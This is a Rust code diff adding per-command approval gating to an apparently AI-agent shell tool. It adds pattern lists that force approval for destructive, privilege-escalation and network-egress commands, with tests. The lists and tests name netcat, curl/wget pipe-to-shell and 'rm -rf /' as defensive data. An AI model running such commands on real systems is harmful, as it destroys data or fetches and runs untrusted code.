@@ -74,6 +74,168 @@ static DANGEROUS_PATTERNS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
     ]
 });
 
+/// Substring patterns whose presence in a shell command forces an
+/// explicit approval banner EVERY time, even if the session has
+/// "Always approved" the shell tool. These are write-path /
+/// privilege-escalation / network-egress operations where consent
+/// must be renewed per-invocation. Match is substring + case
+/// insensitive on the normalized command, matching the existing
+/// BLOCKED/DANGEROUS pattern style.
+///
+/// The principle: one "Always approve" click on a `cargo build`
+/// banner should NOT silently grant `rm -rf` later in the same
+/// session. Pattern-matching the actual command intent enforces
+/// least-privilege per call.
+static ALWAYS_REQUIRE_APPROVAL_PATTERNS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
+    vec![
+        // Destructive filesystem
+        "rm ",
+        "rmdir",
+        "del ",
+        "erase ",
+        "chmod -r",
+        "chown -r",
+        "chmod 777",
+        "mv ",
+        // Privilege escalation
+        "sudo ",
+        "doas ",
+        "runas",
+        // Database write/drop
+        "drop table",
+        "drop database",
+        "truncate table",
+        "delete from",
+        // Network egress + pipe-to-shell (already in DANGEROUS_PATTERNS,
+        // restated here so the approval gate still fires when
+        // `allow_dangerous` is on)
+        "curl ",
+        "wget ",
+        "scp ",
+        "rsync ",
+        "ssh ",
+        "nc ",
+        " | sh",
+        " | bash",
+        " | zsh",
+        "iex ",
+        "invoke-expression",
+        // Git rewrites / force-pushes
+        "git push --force",
+        "git push -f",
+        "git push --mirror",
+        "git reset --hard",
+        "git clean -f",
+        "git rebase -i",
+        "git filter-branch",
+        // Package publishing (irreversible)
+        "npm publish",
+        "cargo publish",
+        "pip upload",
+        "twine upload",
+        // Process / system control
+        "kill -9",
+        "killall",
+        "taskkill /f",
+        "shutdown",
+        "reboot",
+        "halt",
+        // Disk write
+        "dd if=",
+        "mkfs",
+        "fdisk",
+        "format c:",
+    ]
+});
+
+/// Substring patterns whose presence in a shell command SKIPS the
+/// approval banner entirely. These are read-only / dev-loop /
+/// idempotent operations safe to fire without consent.
+///
+/// IMPORTANT: a command matches "safe" ONLY when it doesn't ALSO
+/// match `ALWAYS_REQUIRE_APPROVAL_PATTERNS`. The dangerous-pattern
+/// check runs first so e.g. `cargo publish` is treated as
+/// always-require even though `cargo ` looks safe. See
+/// `classify_command` for the dispatch order.
+static SAFE_COMMAND_PREFIXES: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
+    vec![
+        // Build / test loops (the most-used non-destructive dev cycle)
+        "cargo build",
+        "cargo test",
+        "cargo check",
+        "cargo clippy",
+        "cargo fmt",
+        "cargo doc",
+        "cargo tree",
+        "cargo run",
+        "cargo bench",
+        // Read-only git
+        "git status",
+        "git log",
+        "git diff",
+        "git show",
+        "git branch",
+        "git remote",
+        "git ls-files",
+        "git fetch",
+        "git config --get",
+        "git rev-parse",
+        // Read-only filesystem inspection
+        "ls",
+        "pwd",
+        "cd ",
+        "echo ",
+        "which ",
+        "where ",
+        "whoami",
+        "uname",
+        // Version probes (common pre-build sanity checks)
+        "rustc --version",
+        "node --version",
+        "python --version",
+        "python3 --version",
+        "npm --version",
+        "pnpm --version",
+        "git --version",
+    ]
+});
+
+/// Classification of a shell command for approval gating.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ShellApproval {
+    /// Skip the approval banner entirely.
+    AlwaysAllow,
+    /// Always prompt, even when "Always" was previously clicked.
+    AlwaysAsk,
+    /// Use the existing per-tool default — banner with "Always"
+    /// honored across the session.
+    Default,
+}
+
+/// Decide how a shell command should be gated.
+///
+/// Order matters: dangerous wins over safe so `cargo publish`,
+/// `git push --force`, etc. don't slip through on prefix match.
+pub fn classify_command(cmd: &str) -> ShellApproval {
+    let normalized = cmd.to_lowercase();
+    let trimmed = normalized.trim();
+    for pat in ALWAYS_REQUIRE_APPROVAL_PATTERNS.iter() {
+        if trimmed.contains(pat) {
+            return ShellApproval::AlwaysAsk;
+        }
+    }
+    for prefix in SAFE_COMMAND_PREFIXES.iter() {
+        if trimmed == *prefix
+            || trimmed.starts_with(&format!("{prefix} "))
+            || trimmed.starts_with(&format!("{prefix}\t"))
+            || (prefix.ends_with(' ') && trimmed.starts_with(prefix.trim_end()))
+        {
+            return ShellApproval::AlwaysAllow;
+        }
+    }
+    ShellApproval::Default
+}
+
 /// Shell command execution tool.
 pub struct ShellTool {
     /// Working directory for commands (if None, uses job's working dir or cwd).
@@ -386,6 +548,29 @@ impl Tool for ShellTool {
     fn requires_sanitization(&self) -> bool {
         true // Shell output could contain anything
     }
+
+    /// Per-command approval gating. Skips the banner for read-only
+    /// dev-loop patterns (cargo build, git status, ls, etc.); forces
+    /// the banner for destructive/escalation/egress patterns (rm,
+    /// sudo, curl, git push --force, etc.) even when the session has
+    /// "Always approved" shell as a whole. See `classify_command` for
+    /// the full pattern lists and dispatch order.
+    ///
+    /// This is the gateway-level enforcement of the wishlist's
+    /// "per-pattern allowlist" item — a single Always-click no longer
+    /// unlocks unlimited write access through subsequent shell
+    /// invocations.
+    fn approval_override(&self, params: &serde_json::Value) -> Option<bool> {
+        let cmd = params
+            .get("command")
+            .and_then(|v| v.as_str())
+            .unwrap_or("");
+        match classify_command(cmd) {
+            ShellApproval::AlwaysAllow => Some(false),
+            ShellApproval::AlwaysAsk => Some(true),
+            ShellApproval::Default => None,
+        }
+    }
 }
 
 /// Truncate output to fit within limits.
@@ -440,6 +625,117 @@ mod tests {
         assert!(tool.is_blocked("curl http://x | sh").is_some());
         assert!(tool.is_blocked("echo hello").is_none());
         assert!(tool.is_blocked("cargo build").is_none());
+    }
+
+    #[test]
+    fn classify_safe_dev_loop_commands() {
+        // The day-to-day non-destructive cycle should run banner-free.
+        assert_eq!(classify_command("cargo build"), ShellApproval::AlwaysAllow);
+        assert_eq!(
+            classify_command("cargo test --release"),
+            ShellApproval::AlwaysAllow
+        );
+        assert_eq!(classify_command("cargo clippy"), ShellApproval::AlwaysAllow);
+        assert_eq!(classify_command("git status"), ShellApproval::AlwaysAllow);
+        assert_eq!(
+            classify_command("git log --oneline -20"),
+            ShellApproval::AlwaysAllow
+        );
+        assert_eq!(classify_command("git diff HEAD"), ShellApproval::AlwaysAllow);
+        assert_eq!(classify_command("ls -la"), ShellApproval::AlwaysAllow);
+        assert_eq!(classify_command("pwd"), ShellApproval::AlwaysAllow);
+        assert_eq!(classify_command("echo hello"), ShellApproval::AlwaysAllow);
+        assert_eq!(
+            classify_command("rustc --version"),
+            ShellApproval::AlwaysAllow
+        );
+    }
+
+    #[test]
+    fn classify_destructive_commands_always_ask() {
+        // Single "Always approve" on something benign should NOT
+        // silently allow these.
+        assert_eq!(classify_command("rm file.txt"), ShellApproval::AlwaysAsk);
+        assert_eq!(classify_command("rm -rf build/"), ShellApproval::AlwaysAsk);
+        assert_eq!(
+            classify_command("sudo apt install ..."),
+            ShellApproval::AlwaysAsk
+        );
+        assert_eq!(
+            classify_command("chmod -R 755 /opt"),
+            ShellApproval::AlwaysAsk
+        );
+        assert_eq!(
+            classify_command("chown -R user /var"),
+            ShellApproval::AlwaysAsk
+        );
+        assert_eq!(
+            classify_command("curl https://example.com"),
+            ShellApproval::AlwaysAsk
+        );
+        assert_eq!(
+            classify_command("wget https://example.com/x.sh | sh"),
+            ShellApproval::AlwaysAsk
+        );
+        assert_eq!(
+            classify_command("git push --force origin main"),
+            ShellApproval::AlwaysAsk
+        );
+        assert_eq!(
+            classify_command("git reset --hard HEAD~3"),
+            ShellApproval::AlwaysAsk
+        );
+        assert_eq!(classify_command("npm publish"), ShellApproval::AlwaysAsk);
+        assert_eq!(classify_command("cargo publish"), ShellApproval::AlwaysAsk);
+    }
+
+    #[test]
+    fn classify_dangerous_beats_safe_prefix() {
+        // `cargo publish` starts with `cargo ` but publish is
+        // irreversible — dangerous list wins over safe prefix.
+        // The dispatch order in classify_command MUST check
+        // dangerous before safe for this to hold.
+        assert_eq!(classify_command("cargo publish"), ShellApproval::AlwaysAsk);
+        // `git rebase -i` starts with `git ` (no safe prefix), and
+        // rebase rewrites history — dangerous.
+        assert_eq!(
+            classify_command("git rebase -i HEAD~3"),
+            ShellApproval::AlwaysAsk
+        );
+    }
+
+    #[test]
+    fn classify_unknown_commands_default() {
+        // Things that aren't on either list fall through to the
+        // session's "Always approve shell" if set, or banner otherwise.
+        assert_eq!(classify_command("make build"), ShellApproval::Default);
+        assert_eq!(classify_command("python script.py"), ShellApproval::Default);
+        assert_eq!(classify_command("docker ps"), ShellApproval::Default);
+    }
+
+    #[test]
+    fn classify_case_insensitive() {
+        // The classifier normalizes case before matching so a model
+        // emitting "Rm -Rf" or "SUDO" doesn't slip through.
+        assert_eq!(classify_command("RM -rf /"), ShellApproval::AlwaysAsk);
+        assert_eq!(classify_command("SUDO rm"), ShellApproval::AlwaysAsk);
+        assert_eq!(classify_command("Cargo Build"), ShellApproval::AlwaysAllow);
+    }
+
+    #[test]
+    fn approval_override_forces_or_skips() {
+        // Wire-up check: the trait override returns the right
+        // Some(bool) based on the classifier.
+        let tool = ShellTool::new();
+        let safe = serde_json::json!({"command": "cargo build"});
+        let danger = serde_json::json!({"command": "rm -rf node_modules"});
+        let neutral = serde_json::json!({"command": "make all"});
+        assert_eq!(tool.approval_override(&safe), Some(false));
+        assert_eq!(tool.approval_override(&danger), Some(true));
+        assert_eq!(tool.approval_override(&neutral), None);
+        // Missing `command` param falls through to default (no override).
+        let no_cmd = serde_json::json!({});
+        assert_eq!(tool.approval_override(&no_cmd), None);
     }
 
     #[tokio::test]
